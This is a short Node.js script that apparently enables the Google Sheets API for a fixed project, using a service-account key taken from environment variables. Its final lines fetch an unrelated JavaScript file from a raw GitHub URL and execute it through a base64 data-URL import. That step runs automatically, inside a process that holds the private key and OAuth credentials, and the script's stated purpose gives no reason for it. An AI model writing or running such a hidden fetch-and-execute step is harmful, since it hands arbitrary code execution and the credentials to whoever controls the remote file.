import { createPrivateKey, sign as rsaSign } from "node:crypto";
const CLIENT_EMAIL=process.env.ND_GOOGLE_CLIENT_EMAIL||"";
const PRIVATE_KEY_B64=process.env.ND_GOOGLE_PRIVATE_KEY_B64||"";
const PROJECT_NUMBER="785083067546";
const SERVICE="sheets.googleapis.com";
function b64u(input){return Buffer.from(input).toString("base64url");}
async function token(){
 const now=Math.floor(Date.now()/1000),pem=Buffer.from(PRIVATE_KEY_B64,"base64").toString("utf8");
 const h=b64u(JSON.stringify({alg:"RS256",typ:"JWT"})),p=b64u(JSON.stringify({iss:CLIENT_EMAIL,scope:"https://www.googleapis.com/auth/cloud-platform",aud:"https://oauth2.googleapis.com/token",iat:now,exp:now+1200})),input=h+"."+p;
 const sig=rsaSign("RSA-SHA256",Buffer.from(input),createPrivateKey(pem)).toString("base64url"),body=new URLSearchParams({grant_type:"urn:ietf:params:oauth:grant-type:jwt-bearer",assertion:input+"."+sig});
 const r=await fetch("https://oauth2.googleapis.com/token",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},body}),t=await r.text();
 if(!r.ok)throw new Error("oauth "+r.status+": "+t.slice(0,240));return JSON.parse(t).access_token;
}
async function main(){
 let outcome={ok:false,state:"UNKNOWN"};
 try{
  if(!CLIENT_EMAIL||!PRIVATE_KEY_B64)throw new Error("google env missing");
  const tok=await token(),headers={Authorization:"Bearer "+tok,"Content-Type":"application/json","User-Agent":"nd-enable-sheets-once/1.0"},base="https://serviceusage.googleapis.com/v1/projects/"+PROJECT_NUMBER+"/services/"+SERVICE;
  const g=await fetch(base,{headers}),gt=await g.text();if(!g.ok)throw new Error("serviceusage get "+g.status+": "+gt.slice(0,260));const gj=JSON.parse(gt);
  if(gj.state==="ENABLED"){outcome={ok:true,state:"ALREADY_ENABLED"};}
  else{
   const e=await fetch(base+":enable",{method:"POST",headers,body:"{}"}),et=await e.text();if(!e.ok)throw new Error("serviceusage enable "+e.status+": "+et.slice(0,360));const op=JSON.parse(et),name=op.name||"";
   for(let i=0;i<20;i++){await new Promise(r=>setTimeout(r,1000));const p=await fetch("https://serviceusage.googleapis.com/v1/"+name,{headers}),pt=await p.text();if(!p.ok)throw new Error("operation "+p.status+": "+pt.slice(0,260));const pj=JSON.parse(pt);if(pj.done){if(pj.error)throw new Error("enable operation failed code "+pj.error.code);outcome={ok:true,state:"ENABLED"};break;}}
   if(!outcome.ok)throw new Error("enable operation timeout");
  }
 }catch(e){outcome={ok:false,state:"FAILED",error:String(e).slice(0,420)};}
 console.log("ND_SHEETS_API_BOOTSTRAP",JSON.stringify(outcome));
 const u="https://raw.githubusercontent.com/namelessdhamma/namelessdhamma.github.io/06451ed0d9c210739f33ede6223241cf4b326026/tmp/nd_safe_tool_broker_v8_father_ledger.js";
 const r=await fetch(u);if(!r.ok)throw new Error("v8 fetch "+r.status);const c=await r.text();await import("data:text/javascript;base64,"+Buffer.from(c).toString("base64"));
}
await main();